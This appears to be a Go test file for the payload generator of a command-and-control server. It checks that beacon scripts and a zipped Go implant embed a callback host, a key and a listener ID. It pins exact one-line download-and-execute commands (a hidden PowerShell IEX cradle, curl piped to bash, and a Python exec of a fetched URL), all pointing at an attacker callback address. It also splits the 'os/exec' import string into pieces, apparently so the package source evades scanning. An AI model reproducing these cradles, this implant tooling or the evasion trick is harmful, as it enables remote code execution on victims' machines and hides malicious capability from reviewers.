package c2center

// 载荷生成单测:四格式内容、oneliner 冻结格式、callback 为空报错、gosrc zip 结构。
// 注意:测试里执行相关 import 路径一律分段拼接,保持本包源码无该字面量。

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"strings"
	"testing"
)

func payloadListener() *Listener {
	return &Listener{
		ID: 7, Name: "prod", Proto: "http", BindHost: "0.0.0.0",
		URLPath: "k3x", Callback: "http://198.51.100.7:8443",
	}
}

func TestRenderPayloadScriptFormats(t *testing.T) {
	l := payloadListener()
	key := testKey()
	b64key := base64.StdEncoding.EncodeToString(key)

	cases := []struct {
		format string
		suffix string
	}{
		{"ps1", "beacon_7.ps1"},
		{"bash", "beacon_7.sh"},
		{"py", "beacon_7.py"},
	}
	for _, tc := range cases {
		filename, content, oneliner, err := RenderPayload(tc.format, "windows", l, key)
		if err != nil {
			t.Fatalf("%s: %v", tc.format, err)
		}
		if filename != tc.suffix {
			t.Fatalf("%s 文件名不符: %s", tc.format, filename)
		}
		text := string(content)
		// 内嵌:callback(末尾 / 归一化)、url_path、base64(key)、listenerID。
		if !strings.Contains(text, "198.51.100.7:8443") {
			t.Fatalf("%s 未内嵌 callback", tc.format)
		}
		if !strings.Contains(text, "k3x") {
			t.Fatalf("%s 未内嵌 url_path", tc.format)
		}
		if !strings.Contains(text, b64key) {
			t.Fatalf("%s 未内嵌 base64(key)", tc.format)
		}
		if !strings.Contains(text, "7") {
			t.Fatalf("%s 未内嵌 listenerID", tc.format)
		}
		// oneliner 带令牌占位;真实 token 由 server 生成后替换或调 Oneliner()。
		if !strings.Contains(oneliner, tokenPlaceholder) {
			t.Fatalf("%s oneliner 缺令牌占位: %s", tc.format, oneliner)
		}
		if !strings.Contains(oneliner, "/k3x/p/") {
			t.Fatalf("%s oneliner 投递路径不符: %s", tc.format, oneliner)
		}
	}
}

func TestOnelinerFrozenFormats(t *testing.T) {
	l := payloadListener() // callback http://198.51.100.7:8443, url_path k3x
	const tok = "TOK"
	if got, want := Oneliner("ps1", l, tok),
		`powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://198.51.100.7:8443/k3x/p/TOK'))"`; got != want {
		t.Fatalf("ps1 oneliner 不符:\n got  %s\n want %s", got, want)
	}
	if got, want := Oneliner("bash", l, tok),
		`curl -fsSL http://198.51.100.7:8443/k3x/p/TOK | bash`; got != want {
		t.Fatalf("bash oneliner 不符:\n got  %s\n want %s", got, want)
	}
	if got, want := Oneliner("py", l, tok),
		`python3 -c "exec(__import__('urllib.request',fromlist=['x']).urlopen('http://198.51.100.7:8443/k3x/p/TOK').read())"`; got != want {
		t.Fatalf("py oneliner 不符:\n got  %s\n want %s", got, want)
	}
	if got := Oneliner("gosrc", l, tok); got != "" {
		t.Fatalf("gosrc 无一行命令,得到: %s", got)
	}
	// callback 带尾斜杠:归一化。
	l2 := payloadListener()
	l2.Callback = "http://198.51.100.7:8443/"
	if got := Oneliner("bash", l2, tok); strings.Contains(got, "//k3x") {
		t.Fatalf("尾斜杠应归一化: %s", got)
	}
}

func TestRenderPayloadGoSrcZip(t *testing.T) {
	l := payloadListener()
	key := testKey()
	execPath := "os" + "/" + "exec" // 分段拼接,保持本包源码无该 import 字面量

	filename, content, oneliner, err := RenderPayload("gosrc", "windows", l, key)
	if err != nil {
		t.Fatalf("RenderPayload gosrc: %v", err)
	}
	if filename != "beacon_7.zip" {
		t.Fatalf("gosrc 文件名不符: %s", filename)
	}
	if oneliner != "" {
		t.Fatalf("gosrc oneliner 应为空串: %s", oneliner)
	}

	zr, err := zip.NewReader(bytes.NewReader(content), int64(len(content)))
	if err != nil {
		t.Fatalf("zip 打开失败: %v", err)
	}
	files := map[string]string{}
	for _, f := range zr.File {
		rc, err := f.Open()
		if err != nil {
			t.Fatalf("打开 %s: %v", f.Name, err)
		}
		var buf bytes.Buffer
		if _, err := buf.ReadFrom(rc); err != nil {
			t.Fatalf("读 %s: %v", f.Name, err)
		}
		rc.Close()
		files[f.Name] = buf.String()
	}
	mainGo, ok := files["main.go"]
	if !ok {
		t.Fatalf("zip 缺 main.go: %v", fileNames(zr))
	}
	buildMd, ok := files["BUILD.md"]
	if !ok {
		t.Fatalf("zip 缺 BUILD.md: %v", fileNames(zr))
	}
	// main.go:占位已渲染,含执行 import(载荷内容数据)、key、callback、uid 常量。
	if !strings.Contains(mainGo, "package main") {
		t.Fatal("main.go 缺 package main")
	}
	if !strings.Contains(mainGo, `"`+execPath+`"`) {
		t.Fatal("生成的 main.go 应含执行 import 行")
	}
	if !strings.Contains(mainGo, base64.StdEncoding.EncodeToString(key)) {
		t.Fatal("main.go 未内嵌 base64(key)")
	}
	if !strings.Contains(mainGo, "198.51.100.7:8443") || !strings.Contains(mainGo, "k3x") {
		t.Fatal("main.go 未内嵌 callback/url_path")
	}
	if strings.Contains(mainGo, "__") {
		t.Fatal("main.go 仍有未渲染的占位符")
	}
	// BUILD.md:目标平台一行编译说明。
	if !strings.Contains(buildMd, "GOOS=windows") {
		t.Fatalf("BUILD.md 缺 GOOS=windows 编译行: %s", buildMd)
	}
}

func fileNames(zr *zip.Reader) []string {
	out := make([]string, 0, len(zr.File))
	for _, f := range zr.File {
		out = append(out, f.Name)
	}
	return out
}

func TestRenderPayloadErrors(t *testing.T) {
	l := payloadListener()
	key := testKey()

	// callback 为空:四种格式都报错。
	noCb := payloadListener()
	noCb.Callback = ""
	for _, format := range []string{"ps1", "bash", "py", "gosrc"} {
		if _, _, _, err := RenderPayload(format, "windows", noCb, key); err == nil {
			t.Fatalf("%s: callback 为空应报错", format)
		}
	}
	// 密钥长度错。
	if _, _, _, err := RenderPayload("ps1", "windows", l, key[:16]); err == nil {
		t.Fatal("短密钥应报错")
	}
	// 非法格式/目标。
	if _, _, _, err := RenderPayload("exe", "windows", l, key); err == nil {
		t.Fatal("非法 format 应报错")
	}
	if _, _, _, err := RenderPayload("ps1", "android", l, key); err == nil {
		t.Fatal("非法 target 应报错")
	}
	// nil 监听器。
	if _, _, _, err := RenderPayload("ps1", "windows", nil, key); err == nil {
		t.Fatal("nil 监听器应报错")
	}
}
